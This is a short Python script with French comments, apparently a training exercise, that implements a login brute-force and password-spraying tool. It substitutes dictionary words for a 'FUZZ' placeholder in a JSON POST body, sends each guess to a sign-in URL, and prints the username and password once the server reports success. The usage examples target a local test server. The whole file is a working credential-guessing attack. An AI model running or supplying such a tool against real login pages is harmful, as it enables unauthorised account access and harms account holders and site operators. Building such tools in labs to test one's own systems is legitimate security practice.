import httpx
import argparse
import json 

# Développez un outil de fuzzing.
# voilà comment utiliser l'outil:

# Pour réaliser une attaque de brute force :
# $ py h4cktools.py -u '""http://127.0.0.1:8000/signin/""' -d passwords.txt -p '{ ""username"": ""Coco"", ""password"": ""FUZZ"" }'

# Pour réaliser une attaque de password spraying :
# $ h4cktool -u http://127.0.0.1:8000/signin -d users.txt -p '{ "username": "FUZZ", "password": "password" }'

# L'objectif est de remplacer "FUZZ" par les mots du dictionnaire et d'envoyer le résultat dans le body
# d'une requête POST envoyée à l'URL

# -u, --url
# -d, --dict
# -p, --post

def argument():
    parser = argparse.ArgumentParser(description="Script de copie de fichiers")

    parser.add_argument("-u", "--url", help="url path", required=True)
    parser.add_argument("-d", "--dict", help="path to dictionary file", required=True)
    parser.add_argument("-p", "--post", help="delay between try", required=True)
    parser.add_argument("-h2", "--help2", action="store_true", help="view all possible command")

    args = parser.parse_args()
    return args.dict, args.url, args.post

def dictionary(line):
    return line.strip()

if __name__ == "__main__":
    dico, url, data=argument()

    dic_data = json.loads(data)
    if dic_data["username"] == "FUZZ":
        choice = "username"
    else:
        choice = "password"
    file_dict = open(dico, "r")
    line_dict = file_dict.readline()
    
    while line_dict:
        print(line_dict)
        passwd = dictionary(line_dict)
        dic_data.update({choice: passwd})
        r = httpx.post(url, json=dic_data)
        response = r.json()
        if response['Success']:
            print("username:", dic_data['username'], "password:", dic_data['password'])
            break
        line_dict = file_dict.readline()
    file_dict.close()

